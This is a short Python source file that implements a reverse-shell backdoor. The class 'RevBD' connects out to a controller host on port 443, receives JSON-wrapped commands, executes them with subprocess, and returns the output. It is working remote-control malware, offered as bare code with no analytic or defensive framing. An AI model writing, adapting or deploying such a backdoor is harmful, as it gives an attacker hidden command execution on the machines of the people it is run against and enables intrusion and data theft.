import socket
import subprocess
import os
import json

bufferSz = 1024

class RevBD:
    def __init__(self, host, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((host, port))
    
    def exCmd(self, cmd):
        if cmd[:2] == "cd":
            self.changeWD(cmd[3:])
        elif len(cmd) > 0:
            return subprocess.getoutput(cmd)
        else:
            return ""
    
    def changeWD(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    
    def json_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())
    
    def json_resc(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(bufferSz).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def run(self):
        # try:
        while True:
            # cmd = self.conn.recv(bufferSz).decode("utf-8")
            # res = self.exCmd(cmd)
            # self.conn.send(res.encode())
            cmd = self.json_resc()
            if cmd == "exit":
                self.conn.close()
                exit()
            res = self.exCmd(cmd)
            self.json_send(res)
        # except Exception as e:
        #     print(e)
        #     self.conn.close()

def main():
    host = "127.0.0.1"
    port = 443
    bd = RevBD(host, port)
    bd.run()

if __name__ == "__main__":
    main()
